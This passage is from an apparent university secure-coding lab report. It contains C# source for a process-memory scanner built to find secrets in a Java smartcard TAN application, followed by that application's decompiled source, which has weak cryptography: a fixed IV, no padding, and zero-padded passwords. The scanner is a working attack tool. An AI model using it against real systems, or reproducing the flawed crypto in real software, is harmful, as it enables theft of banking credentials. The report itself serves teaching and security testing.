            {
                get
                {
                    return this.message;
                }

                set
                {
                    this.message = value;
                }
            }
        }
        #endregion

        #region Constructor
        public MemoryScanner(ReadMem reader, IntPtr baseAddress, IntPtr lastAddress, Int64 searchValue)
        {
            this.searchValue = searchValue;
            this.searchValueBytesCount = 8;
            this.scanDifference = searchValueBytesCount - 1;
            this.foundAddresses = new List<int>();
            this.baseAddress = baseAddress;
            this.lastAddress = lastAddress;
            this.scanAreaSize = (int) ((int)this.lastAddress - (int)this.baseAddress);
            this.readBufferSize = 20480;
            this.reader = reader;
        }
        #endregion

        #region Accessors
        public List<int> FoundAddresses
        {
            get
            {
                return this.foundAddresses;
            }
        }
        #endregion

        #region Methods
        private void findInt64InArray(int currentAddress, byte[] memoryContents, Int64 searchValue)
        {
            if (memoryContents.Length > 0)
            {
                for (int j = 0; j < memoryContents.Length - 7; j++)
                {
                    if (BitConverter.ToInt64(memoryContents, j) == searchValue)
                    {
                        foundAddresses.Add(currentAddress + j);
                        MessagePending(this, new MessagePendingEventArgs("Search Value (" + searchValue + ") found at: " + (currentAddress + j).ToString("X"), true));
                    }
                }
            }
        }

        public void updateProgress(int percentComplete)
        {
            // New Event Args for progress tracking
            ProgressChangedEventArgs progressChangedEventArgs = new ProgressChangedEventArgs(percentComplete);            

            // raise the event
            ProgressChanged(this, progressChangedEventArgs);
        }

        public void scan()
        {
            MessagePending(this, new MessagePendingEventArgs("Search Value: " + searchValue, true));
            MessagePending(this, new MessagePendingEventArgs("Search Value ASCII: " + Encoding.ASCII.GetString(BitConverter.GetBytes(searchValue)), true));
            MessagePending(this, new MessagePendingEventArgs("Start Address: " + baseAddress.ToString("X"), true));
            MessagePending(this, new MessagePendingEventArgs("Last Adddress: " + lastAddress.ToString("X"), true));
            MessagePending(this, new MessagePendingEventArgs("Search Area: " + ((int)lastAddress - (int)baseAddress).ToString("X"), true));

            // If the scan area is greater than the read buffer -> iterate
            if (scanAreaSize > readBufferSize)
            {
                // Number of iterations required
                int numIterations = scanAreaSize / readBufferSize;
                
                // Remainder in bytes
                int remainingBytes = scanAreaSize % readBufferSize;

                // Set current address to base address
                int currentAddress = (int)baseAddress;

                // Number of bytes read
                // int bytesReadCount;

                // Number of bytes to read
                int bytesToRead = readBufferSize;

                // Byte array of memory contents read
                byte[] memoryContents;

                // Percentage of addresses read / memory scanned
                int progress;

                // Iterate: Read memory blocks of length readBufferSize into memoryContents
                for (int i = 0; i < numIterations; i++)
                {
                    // Update percentage of addresses read
                    progress = (int) (((double) (currentAddress - (int) baseAddress) / (double) scanAreaSize) * 100d);
                    updateProgress(progress);

                    memoryContents = ReadMem.ReadMemory(currentAddress, bytesToRead, reader.processHandle);

                    findInt64InArray(currentAddress, memoryContents, searchValue);

                    // Increase currentAddress by the amount of bytes read minus the scanDifference.
                    currentAddress += memoryContents.Length - scanDifference;

                    // Increase the size of the readBuffer to account for the skipped bytes
                    bytesToRead = readBufferSize + scanDifference;
                }

                // If there are additional bytes smaller than the readBufferSize, read them as well and look
                // for our search value
                if (remainingBytes > 0)
                {
                    bytesToRead = (int)lastAddress - currentAddress;
                    memoryContents = ReadMem.ReadMemory(currentAddress, bytesToRead, reader.processHandle);
                    
                    findInt64InArray(currentAddress, memoryContents, searchValue);

                }
            }
            // If the block could be read in just one read,
            else
            {
                //Calculate the memory block's size.
                int blockSize = scanAreaSize % readBufferSize;

                //Set the currentAddress to first address.
                int currentAddress = (int)baseAddress;

                //If the memory block can contain at least one 64 bit variable.
                if (blockSize > 8)
                {
                    //Read the bytes to the array.
                    byte[] memoryContents = ReadMem.ReadMemory(currentAddress, blockSize, reader.processHandle);
                    findInt64InArray(currentAddress, memoryContents, searchValue);
                }
            }

            updateProgress(100);
            MessagePending(this, new MessagePendingEventArgs("Scan finished. Found: " + foundAddresses.Count + " instances of the search value (" + searchValue + ").", true));
            MessagePending(this, new MessagePendingEventArgs("  List of addresses: ", true));
            foreach (int address in foundAddresses)
            {
                MessagePending(this, new MessagePendingEventArgs("    Address: " + address.ToString("X"), true));
            }
            //Close the handle to the process to avoid process errors.
            // reader.CloseHandle();

        } // End of Scan Method
        #endregion
    } // End of Memory Scanner Class
}

\end{lstlisting}

\section{Settings}

\begin{lstlisting}
/* 
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SecCodeSCSExploit
{
    class Settings
    {
        public static String processName = "javaw";
        // Starting Address
        public static String addressBegin = "00000000";
        // Ending Address
        public static String addressEnd = "1CCCCCCF";
        // Direction of dump
        public static bool upwardsDump = true; // true = upwards, false = downwards
        // Size of dump area in bytes
        public static int dumpSizeBytes = 1024;
    }
}
\end{lstlisting}

\chapter{Decompiled Java-SCS of NEXT9Bank}

These are the classes of the package \textit{de.next9bank.scs}. The source code of third party libraries has been omitted.


\section{Package \textit{gui.controllers}}

\subsection{CreateTanController}

\begin{lstlisting}
/*     */ package de.next9bank.scs.gui.controllers;
/*     */ 
/*     */ import de.next9bank.scs.gui.GuiError;
/*     */ import de.next9bank.scs.gui.GuiShowTan;
/*     */ import de.next9bank.scs.helpers.TanCreator;
/*     */ import de.next9bank.scs.model.Storage;
/*     */ import java.io.File;
/*     */ import javafx.fxml.FXML;
/*     */ import javafx.scene.Scene;
/*     */ import javafx.scene.control.Button;
/*     */ import javafx.scene.control.TextField;
/*     */ import javafx.scene.image.ImageView;
/*     */ import javafx.scene.input.Clipboard;
/*     */ import javafx.scene.input.ClipboardContent;
/*     */ import javafx.stage.FileChooser;
/*     */ 
/*     */ public class CreateTanController
/*     */ {
/*  19 */   Storage s = Storage.getStorage();
/*     */ 
/*     */   @FXML
/*     */   TextField senderInput;
/*     */ 
/*     */   @FXML
/*     */   TextField receiverInput;
/*     */ 
/*     */   @FXML
/*     */   TextField amountInput;
/*     */ 
/*     */   @FXML
/*     */   Button loadBatchFile;
/*     */ 
/*     */   @FXML
/*     */   Button createBatchTransactionTanButton;
/*     */ 
/*     */   @FXML
/*     */   ImageView imgChecked;
/*     */ 
/*     */   @FXML
/*     */   TextField senderInputBatch;
/*  39 */   private FileChooser batchFileChooser = new FileChooser();
/*     */   private File batchFile;
/*     */ 
/*  47 */   public void createSingleTransactionTan() { if ((!checkIfPositiveInteger(this.senderInput.getText())) || 
/*  48 */       (!checkIfPositiveInteger(this.receiverInput
/*  48 */       .getText())) || 
/*  49 */       (!checkIfPositiveDouble(this.amountInput
/*  49 */       .getText()))) {
/*  50 */       GuiError ge = new GuiError("scs.gui.error.numberMustBePositive");
/*  51 */       return;
/*     */     }
/*     */ 
/*  54 */     String tan = TanCreator.createSingleTan(this.senderInput.getText(), this.receiverInput
/*  55 */       .getText(), this.amountInput.getText());
/*     */ 
/*  57 */     Clipboard clipboard = Clipboard.getSystemClipboard();
/*  58 */     ClipboardContent content = new ClipboardContent();
/*  59 */     content.putString(tan);
/*  60 */     clipboard.setContent(content);
/*     */ 
/*  62 */     GuiShowTan t = new GuiShowTan(tan);
/*  63 */     t.showTan();
/*     */ 
/*  65 */     this.s.setLastTan(tan);
/*  66 */     String newSeed = TanCreator.getNextSeed();
/*  67 */     this.s.writeNewSeed(newSeed); }
/*     */ 
/*     */   public void loadBatchFile()
/*     */   {
/*  71 */     this.batchFile = this.batchFileChooser.showOpenDialog(this.loadBatchFile.getScene()
/*  72 */       .getWindow());
/*  73 */     if (this.batchFile != null)
/*  74 */       this.imgChecked.setVisible(true);
/*     */     else
/*  76 */       this.imgChecked.setVisible(false);
/*     */   }
/*     */ 
/*     */   public void createBatchTransactionTan()
/*     */   {
/*     */     GuiError e;
/*  81 */     if (this.batchFile == null) {
/*  82 */       e = new GuiError("scs.gui.error.noBatchFile");
/*     */     }
/*     */     else {
/*  85 */       if (!checkIfPositiveInteger(this.senderInputBatch.getText())) {
/*  86 */         GuiError ge = new GuiError("scs.gui.error.numberMustBePositive");
/*  87 */         return;
/*     */       }
/*     */ 
/*  90 */       String tan = TanCreator.createBatchTan(this.senderInputBatch.getText(), this.batchFile);
/*     */ 
/*  93 */       Clipboard clipboard = Clipboard.getSystemClipboard();
/*  94 */       ClipboardContent content = new ClipboardContent();
/*  95 */       content.putString(tan);
/*  96 */       clipboard.setContent(content);
/*     */ 
/*  98 */       GuiShowTan t = new GuiShowTan(tan);
/*  99 */       t.showTan();
/*     */ 
/* 101 */       this.s.setLastTan(tan);
/* 102 */       String newSeed = TanCreator.getNextSeed();
/* 103 */       this.s.writeNewSeed(newSeed);
/*     */     }
/*     */   }
/*     */ 
/*     */   public boolean checkIfPositiveInteger(String input) {
/*     */     try {
/* 109 */       int i = Integer.parseInt(input);
/* 110 */       if (i <= 0) {
/* 111 */         throw new Exception();
/*     */       }
/* 113 */       return true; } catch (Exception e) {
/*     */     }
/* 115 */     return false;
/*     */   }
/*     */ 
/*     */   public boolean checkIfPositiveDouble(String input)
/*     */   {
/*     */     try
/*     */     {
/* 122 */       double i = Double.parseDouble(input);
/* 123 */       if (i <= 0.0D) {
/* 124 */         throw new Exception();
/*     */       }
/* 126 */       return true; } catch (Exception e) {
/*     */     }
/* 128 */     return false;
/*     */   }
/*     */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.controllers.CreateTanController
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{MainController}

\begin{lstlisting}
package de.next9bank.scs.gui.controllers;

public class MainController
{
}

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.controllers.MainController
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{MenuController}

\begin{lstlisting}
/*     */ package de.next9bank.scs.gui.controllers;
/*     */ 
/*     */ import de.next9bank.scs.gui.GuiError;
/*     */ import de.next9bank.scs.model.Storage;
/*     */ import java.io.File;
/*     */ import java.io.IOException;
/*     */ import java.util.ResourceBundle;
/*     */ import javafx.application.Platform;
/*     */ import javafx.fxml.FXML;
/*     */ import javafx.fxml.FXMLLoader;
/*     */ import javafx.scene.Node;
/*     */ import javafx.scene.Scene;
/*     */ import javafx.scene.control.Menu;
/*     */ import javafx.scene.control.MenuBar;
/*     */ import javafx.scene.layout.BorderPane;
/*     */ import javafx.scene.layout.Pane;
/*     */ import javafx.stage.FileChooser;
/*     */ import javafx.stage.Stage;
/*     */ import javafx.stage.StageStyle;
/*     */ 
/*     */ public class MenuController
/*     */ {
/*     */ 
/*     */   @FXML
/*     */   private MenuBar menuBar;
/*     */ 
/*     */   @FXML
/*     */   private Menu file;
/*     */   Storage s;
/*  33 */   private FileChooser smartCardFileChooser = new FileChooser();
/*     */ 
/*     */   public MenuController() {
/*  36 */     this.s = Storage.getStorage();
/*     */   }
/*     */ 
/*     */   public void loadSmartCard()
/*     */   {
/*  44 */     showMainWindow();
/*  45 */     File smartCardFile = this.smartCardFileChooser.showOpenDialog(this.menuBar
/*  46 */       .getScene().getWindow());
/*  47 */     this.s.setSmartCardFile(smartCardFile);
/*  48 */     if (smartCardFile != null) {
/*  49 */       this.s.readSmartCardFile();
/*     */     }
/*  51 */     if ((this.s.getSmartCardFile() != null) && (this.s.getPrimaryStage() != null)) {
/*  52 */       this.s.getPrimaryStage().getScene().lookup("#imgChecked")
/*  53 */         .setVisible(true);
/*     */     }
/*  54 */     else if ((this.s.getSmartCardFile() == null) && (this.s.getPrimaryStage() != null))
/*  55 */       this.s.getPrimaryStage().getScene().lookup("#imgChecked")
/*  56 */         .setVisible(false);
/*     */   }
/*     */ 
/*     */   public void createTan()
/*     */   {
/*  64 */     if (this.s.getSmartCardFile() == null)
/*  65 */       new GuiError("scs.gui.error.noSmartCard");
/*     */     else
/*  67 */       showCreateTanWindow();
/*     */   }
/*     */ 
/*     */   public void showAboutDialogue()
/*     */   {
/*     */     try
/*     */     {
/*  77 */       BorderPane about = (BorderPane)FXMLLoader.load(
/*  78 */         getClass().getResource("/layouts/About.fxml"), this.s
/*  79 */         .getStringBundle());
/*     */ 
/*  81 */       Stage dialog = new Stage();
/*  82 */       dialog.initStyle(StageStyle.UTILITY);
/*  83 */       dialog.setTitle(this.s.getStringBundle()
/*  84 */         .getString("scs.gui.about.title"));
/*     */ 
/*  85 */       Scene scene = new Scene(about);
/*  86 */       dialog.setScene(scene);
/*  87 */       dialog.show();
/*     */     }
/*     */     catch (IOException e)
/*     */     {
/*  91 */       e.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   public void showCreateTanWindow()
/*     */   {
/*     */     try
/*     */     {
/* 100 */       if (this.s.getPrimaryStage() != null) {
/* 101 */         Pane p = (Pane)FXMLLoader.load(
/* 102 */           getClass().getResource("/layouts/CreateTan.fxml"), this.s
/* 103 */           .getStringBundle());
/* 104 */         this.s.getPrimaryStage().setScene(new Scene(p));
/*     */       }
/*     */     }
/*     */     catch (IOException e) {
/* 108 */       e.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   public void showMainWindow()
/*     */   {
/*     */     try
/*     */     {
/* 117 */       if (this.s.getPrimaryStage() != null)
/*     */       {
/* 119 */         Pane root = (Pane)FXMLLoader.load(
/* 120 */           getClass().getResource("/layouts/Main.fxml"), this.s
/* 121 */           .getStringBundle());
/* 122 */         this.s.getPrimaryStage().setScene(new Scene(root));
/*     */       }
/*     */     }
/*     */     catch (IOException e) {
/* 126 */       e.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   public void close()
/*     */   {
/* 134 */     Platform.exit();
/*     */   }
/*     */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.controllers.MenuController
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}


\section{Package \textit{gui}}

\subsection{GuiEnterPin}

\begin{lstlisting}
// INTERNAL ERROR //

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.GuiEnterPin
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{GuiError}

\begin{lstlisting}
/*    */ package de.next9bank.scs.gui;
/*    */ 
/*    */ import de.next9bank.scs.model.Storage;
/*    */ import java.util.ResourceBundle;
/*    */ import org.controlsfx.dialog.Dialogs;
/*    */ 
/*    */ public class GuiError
/*    */ {
/*    */   Storage s;
/*    */ 
/*    */   public GuiError(String errorMsg)
/*    */   {
/* 15 */     this.s = Storage.getStorage();
/*    */ 
/* 17 */     Dialogs.create().owner(this.s.getPrimaryStage())
/* 18 */       .title(this.s
/* 18 */       .getStringBundle().getString("scs.gui.error.title"))
/* 19 */       .message(this.s
/* 19 */       .getStringBundle().getString(errorMsg)).showError();
/*    */   }
/*    */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.GuiError
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{GuiShowTan}

\begin{lstlisting}
/*    */ package de.next9bank.scs.gui;
/*    */ 
/*    */ import de.next9bank.scs.model.Storage;
/*    */ import java.util.ResourceBundle;
/*    */ import org.controlsfx.dialog.Dialogs;
/*    */ 
/*    */ public class GuiShowTan
/*    */ {
/* 10 */   Storage s = Storage.getStorage();
/*    */   String tan;
/*    */ 
/*    */   public GuiShowTan(String tan)
/*    */   {
/* 16 */     this.tan = tan;
/*    */   }
/*    */ 
/*    */   public void showTan()
/*    */   {
/* 21 */     Dialogs.create()
/* 22 */       .owner(this.s
/* 22 */       .getPrimaryStage())
/* 23 */       .title(this.s
/* 23 */       .getStringBundle()
/* 24 */       .getString("scs.gui.dialog.tan.title"))
/* 25 */       .message(this.s
/* 26 */       .getStringBundle().getString("scs.gui.dialog.tan.tan") + " " + this.tan)
/* 27 */       .showInformation();
/*    */   }
/*    */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.gui.GuiShowTan
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\section{Package \textit{helpers}}

\subsection{Encryption}

\begin{lstlisting}
/*    */ package de.next9bank.scs.helpers;
/*    */ 
/*    */ import java.security.MessageDigest;
/*    */ import java.security.NoSuchAlgorithmException;
/*    */ import java.util.Arrays;
/*    */ 
/*    */ public class Encryption
/*    */ {
/*    */   public static String Encrypt(String data, String password)
/*    */   {
/* 10 */     MCrypt mcrypt = new MCrypt(password + "0000000000");
/*    */     try
/*    */     {
/* 13 */       return MCrypt.bytesToHex(mcrypt.encrypt(data));
/*    */     }
/*    */     catch (Exception e) {
/*    */     }
/* 17 */     return null;
/*    */   }
/*    */ 
/*    */   public static String Decrypt(String encryptedData, String password)
/*    */   {
/* 23 */     MCrypt mcrypt = new MCrypt(password + "0000000000");
/*    */     try
/*    */     {
/* 26 */       return new String(mcrypt.decrypt(encryptedData)).trim();
/*    */     }
/*    */     catch (Exception e) {
/*    */     }
/* 30 */     return null;
/*    */   }
/*    */ 
/*    */   private static byte[] generateKey(byte[] key)
/*    */     throws NoSuchAlgorithmException
/*    */   {
/* 44 */     MessageDigest sha = MessageDigest.getInstance("SHA-1");
/* 45 */     key = sha.digest(key);
/*    */ 
/* 47 */     key = Arrays.copyOf(key, 16);
/* 48 */     return key;
/*    */   }
/*    */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.helpers.Encryption
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{MCrypt}

\begin{lstlisting}
/*     */ package de.next9bank.scs.helpers;
/*     */ 
/*     */ import java.security.NoSuchAlgorithmException;
/*     */ import javax.crypto.Cipher;
/*     */ import javax.crypto.NoSuchPaddingException;
/*     */ import javax.crypto.spec.IvParameterSpec;
/*     */ import javax.crypto.spec.SecretKeySpec;
/*     */ 
/*     */ public class MCrypt
/*     */ {
/*  19 */   private String iv = "fedcba9876543210";
/*     */   private IvParameterSpec ivspec;
/*     */   private SecretKeySpec keyspec;
/*     */   private Cipher cipher;
/*     */ 
/*     */   public MCrypt(String secretKey)
/*     */   {
/*  25 */     this.ivspec = new IvParameterSpec(this.iv.getBytes());
/*     */ 
/*  27 */     this.keyspec = new SecretKeySpec(secretKey.getBytes(), "AES");
/*     */     try
/*     */     {
/*  30 */       this.cipher = Cipher.getInstance("AES/CBC/NoPadding");
/*     */     }
/*     */     catch (NoSuchAlgorithmException e) {
/*  33 */       e.printStackTrace();
/*     */     }
/*     */     catch (NoSuchPaddingException e) {
/*  36 */       e.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   public byte[] encrypt(String text) throws Exception {
/*  41 */     if ((text == null) || (text.length() == 0)) {
/*  42 */       throw new Exception("Empty string");
/*     */     }
/*  44 */     byte[] encrypted = null;
/*     */     try
/*     */     {
/*  47 */       this.cipher.init(1, this.keyspec, this.ivspec);
/*     */ 
/*  49 */       encrypted = this.cipher.doFinal(padString(text).getBytes());
/*     */     } catch (Exception e) {
/*  51 */       throw new Exception("[encrypt] " + e.getMessage());
/*     */     }
/*     */ 
/*  54 */     return encrypted;
/*     */   }
/*     */ 
/*     */   public byte[] decrypt(String code) throws Exception {
/*  58 */     if ((code == null) || (code.length() == 0)) {
/*  59 */       throw new Exception("Empty string");
/*     */     }
/*  61 */     byte[] decrypted = null;
/*     */     try
/*     */     {
/*  64 */       this.cipher.init(2, this.keyspec, this.ivspec);
/*     */ 
/*  66 */       decrypted = this.cipher.doFinal(hexToBytes(code));
/*     */     } catch (Exception e) {
/*  68 */       throw new Exception("[decrypt] " + e.getMessage());
/*     */     }
/*  70 */     return decrypted;
/*     */   }
/*     */ 
/*     */   public static String bytesToHex(byte[] data) {
/*  74 */     if (data == null) {
/*  75 */       return null;
/*     */     }
/*     */ 
/*  78 */     int len = data.length;
/*  79 */     String str = "";
/*  80 */     for (int i = 0; i < len; i++) {
/*  81 */       if ((data[i] & 0xFF) < 16)
/*  82 */         str = str + "0" + Integer.toHexString(data[i] & 0xFF);
/*     */       else
/*  84 */         str = str + Integer.toHexString(data[i] & 0xFF);
/*     */     }
/*  86 */     return str;
/*     */   }
/*     */ 
/*     */   public static byte[] hexToBytes(String str) {
/*  90 */     if (str == null)
/*  91 */       return null;
/*  92 */     if (str.length() < 2) {
/*  93 */       return null;
/*     */     }
/*  95 */     int len = str.length() / 2;
/*  96 */     byte[] buffer = new byte[len];
/*  97 */     for (int i = 0; i < len; i++) {
/*  98 */       buffer[i] = ((byte)Integer.parseInt(str
/*  99 */         .substring(i * 2, i * 2 + 2), 
/*  99 */         16));
/*     */     }
/* 101 */     return buffer;
/*     */   }
/*     */ 
/*     */   private static String padString(String source)
/*     */   {
/* 106 */     char paddingChar = ' ';
/* 107 */     int size = 16;
/* 108 */     int x = source.length() % size;
/* 109 */     int padLength = size - x;
/*     */ 
/* 111 */     for (int i = 0; i < padLength; i++) {
/* 112 */       source = source + paddingChar;
/*     */     }
/*     */ 
/* 115 */     return source;
/*     */   }
/*     */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.helpers.MCrypt
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\subsection{TanCreator}

\begin{lstlisting}
/*     */ package de.next9bank.scs.helpers;
/*     */ 
/*     */ import com.google.common.hash.HashCode;
/*     */ import com.google.common.hash.Hashing;
/*     */ import com.google.common.io.Files;
/*     */ import de.next9bank.scs.model.Storage;
/*     */ import java.io.File;
/*     */ import java.io.IOException;
/*     */ import java.io.UnsupportedEncodingException;
/*     */ import java.security.MessageDigest;
/*     */ import java.security.NoSuchAlgorithmException;
/*     */ 
/*     */ public class TanCreator
/*     */ {
/*  17 */   static Storage s = Storage.getStorage();
/*     */ 
/*     */   public static String createSingleTan(String sender, String receiver, String amount)
/*     */   {
/*  34 */     String hash = generateHash(s.getSeed() + receiver + amount + sender);
/*  35 */     return getTanFromHash(hash);
/*     */   }
/*     */ 
/*     */   public static String createBatchTan(String sender, File file)
/*     */   {
/*     */     try
/*     */     {
/*  47 */       HashCode md5 = Files.hash(file, Hashing.md5());
/*  48 */       String md5Hex = md5.toString();
/*  49 */       String hash = generateHash(s.getSeed() + sender + md5Hex);
/*  50 */       return getTanFromHash(hash);
/*     */     } catch (IOException e) {
/*  52 */       e.printStackTrace();
/*  53 */     }return null;
/*     */   }
/*     */ 
/*     */   private static String getTanFromHash(String hash)
/*     */   {
/*  65 */     hash = hash.substring(0, 6);
/*  66 */     int hashInt = Integer.parseInt(hash, 16);
/*  67 */     hash = String.valueOf(hashInt).substring(0, 6);
/*  68 */     return hash;
/*     */   }
/*     */ 
/*     */   public static String getNextSeed()
/*     */   {
/*  77 */     String hash = generateHash(s.getSeed());
/*  78 */     return hash;
/*     */   }
/*     */ 
/*     */   private static String generateHash(String toHash)
/*     */   {
/*  88 */     MessageDigest md = null;
/*  89 */     byte[] hash = null;
/*     */     try {
/*  91 */       md = MessageDigest.getInstance("SHA-512");
/*  92 */       hash = md.digest(toHash.getBytes("UTF-8"));
/*     */     } catch (NoSuchAlgorithmException e) {
/*  94 */       e.printStackTrace();
/*     */     } catch (UnsupportedEncodingException e) {
/*  96 */       e.printStackTrace();
/*     */     }
/*  98 */     return convertToHex(hash);
/*     */   }
/*     */ 
/*     */   private static String convertToHex(byte[] raw)
/*     */   {
/* 112 */     StringBuffer sb = new StringBuffer();
/* 113 */     for (int i = 0; i < raw.length; i++) {
/* 114 */       sb.append(Integer.toString((raw[i] & 0xFF) + 256, 16)
/* 115 */         .substring(1));
/*     */     }
/*     */ 
/* 117 */     return sb.toString();
/*     */   }
/*     */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.helpers.TanCreator
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\section{Package \textit{model}}

\subsection{Storage}

\begin{lstlisting}
/*     */ package de.next9bank.scs.model;
/*     */ 
/*     */ import de.next9bank.scs.gui.GuiEnterPin;
/*     */ import de.next9bank.scs.gui.GuiError;
/*     */ import de.next9bank.scs.helpers.Encryption;
/*     */ import java.io.BufferedWriter;
/*     */ import java.io.File;
/*     */ import java.io.FileWriter;
/*     */ import java.io.IOException;
/*     */ import java.nio.file.Files;
/*     */ import java.util.ResourceBundle;
/*     */ import javafx.stage.Stage;
/*     */ 
/*     */ public class Storage
/*     */ {
/*  18 */   private static Storage s = null;
/*     */   private File smartCardFile;
/*     */   private ResourceBundle stringBundle;
/*     */   private Stage primaryStage;
/*     */   private String seed;
/*     */   private String lastTan;
/*     */   private String password;
/*     */ 
/*     */   private Storage()
/*     */   {
/*  34 */     ResourceBundle stringBundle = ResourceBundle.getBundle("strings");
/*  35 */     setStringBundle(stringBundle);
/*     */   }
/*     */ 
/*     */   public static Storage getStorage()
/*     */   {
/*  44 */     if (s == null) {
/*  45 */       s = new Storage();
/*     */     }
/*  47 */     return s;
/*     */   }
/*     */ 
/*     */   public File getSmartCardFile() {
/*  51 */     return this.smartCardFile;
/*     */   }
/*     */ 
/*     */   public void setSmartCardFile(File smartCardFile) {
/*  55 */     this.smartCardFile = smartCardFile;
/*     */   }
/*     */ 
/*     */   public ResourceBundle getStringBundle() {
/*  59 */     return this.stringBundle;
/*     */   }
/*     */ 
/*     */   public void setStringBundle(ResourceBundle stringBundle) {
/*  63 */     this.stringBundle = stringBundle;
/*     */   }
/*     */ 
/*     */   public Stage getPrimaryStage() {
/*  67 */     return this.primaryStage;
/*     */   }
/*     */ 
/*     */   public void setPrimaryStage(Stage primaryStage) {
/*  71 */     this.primaryStage = primaryStage;
/*     */   }
/*     */ 
/*     */   public String getSeed() {
/*  75 */     return this.seed;
/*     */   }
/*     */ 
/*     */   public boolean setSeed(String seed) {
/*  79 */     this.seed = seed;
/*  80 */     return true;
/*     */   }
/*     */ 
/*     */   public boolean writeNewSeed(String seed) {
/*  84 */     setSeed(seed);
/*     */     try
/*     */     {
/*  88 */       FileWriter fw = new FileWriter(getSmartCardFile(), false);
/*  89 */       BufferedWriter bw = new BufferedWriter(fw);
/*     */ 
/*  91 */       String s = Encryption.Encrypt(seed, getPassword());
/*     */ 
/*  93 */       bw.write(s);
/*  94 */       bw.close();
/*     */ 
/*  96 */       return true;
/*     */     } catch (IOException e) {
/*  98 */       e.printStackTrace();
/*  99 */     }return false;
/*     */   }
/*     */ 
/*     */   public boolean encryptAndSetSeed(String seed, String password)
/*     */   {
/* 104 */     String s = Encryption.Decrypt(seed, password);
/* 105 */     if (s != null) {
/* 106 */       return setSeed(s);
/*     */     }
/* 108 */     return false;
/*     */   }
/*     */ 
/*     */   public void readSmartCardFile() {
/*     */     try {
/* 113 */       GuiEnterPin p = new GuiEnterPin();
/* 114 */       String password = p.getPassword();
/*     */ 
/* 116 */       if (password != null) {
/* 117 */         setPassword(password);
/* 118 */         if (!encryptAndSetSeed(new String(
/* 119 */           Files.readAllBytes(this.smartCardFile
/* 119 */           .toPath()), "UTF-8"), password))
/*     */         {
/* 123 */           new GuiError("scs.gui.error.smartCardCorrupted");
/* 124 */           setSmartCardFile(null);
/*     */         }
/*     */       } else {
/* 127 */         new GuiError("scs.gui.error.smartCardCorrupted");
/* 128 */         setSmartCardFile(null);
/*     */       }
/*     */     }
/*     */     catch (Exception e) {
/* 132 */       setSmartCardFile(null);
/* 133 */       new GuiError("scs.gui.error.smartCardCorrupted");
/*     */ 
/* 135 */       e.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   public String getLastTan() {
/* 140 */     return this.lastTan;
/*     */   }
/*     */ 
/*     */   public void setLastTan(String lastTan) {
/* 144 */     this.lastTan = lastTan;
/*     */   }
/*     */ 
/*     */   public String getPassword() {
/* 148 */     return this.password;
/*     */   }
/*     */ 
/*     */   public void setPassword(String password) {
/* 152 */     this.password = password;
/*     */   }
/*     */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.model.Storage
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}

\section{Main class}

\subsection{Main}

\begin{lstlisting}
/*    */ package de.next9bank.scs;
/*    */ 
/*    */ import de.next9bank.scs.model.Storage;
/*    */ import java.io.IOException;
/*    */ import java.util.ResourceBundle;
/*    */ import javafx.application.Application;
/*    */ import javafx.collections.ObservableList;
/*    */ import javafx.fxml.FXMLLoader;
/*    */ import javafx.scene.Scene;
/*    */ import javafx.scene.image.Image;
/*    */ import javafx.scene.layout.Pane;
/*    */ import javafx.stage.Stage;
/*    */ 
/*    */ public class Main extends Application
/*    */ {
/* 22 */   Storage s = Storage.getStorage();
/*    */ 
/*    */   public void start(Stage primaryStage)
/*    */   {
/*    */     try
/*    */     {
/* 32 */       showMainStage(primaryStage);
/*    */     }
/*    */     catch (Exception e) {
/* 35 */       e.printStackTrace();
/*    */     }
/*    */   }
/*    */ 
/*    */   private void showMainStage(Stage primaryStage) throws IOException
/*    */   {
/* 41 */     Pane root = (Pane)FXMLLoader.load(getClass()
/* 42 */       .getResource("/layouts/Main.fxml"), 
/* 42 */       this.s.getStringBundle());
/* 43 */     Scene scene = new Scene(root, 600.0D, 400.0D);
/* 44 */     primaryStage.setTitle(this.s.getStringBundle().getString("scs.title"));
/* 45 */     Image ico = new Image("/img/logo.png");
/* 46 */     primaryStage.getIcons().add(ico);
/* 47 */     primaryStage.setScene(scene);
/* 48 */     primaryStage.setResizable(false);
/* 49 */     primaryStage.show();
/*    */ 
/* 51 */     this.s.setPrimaryStage(primaryStage);
/*    */   }
/*    */ 
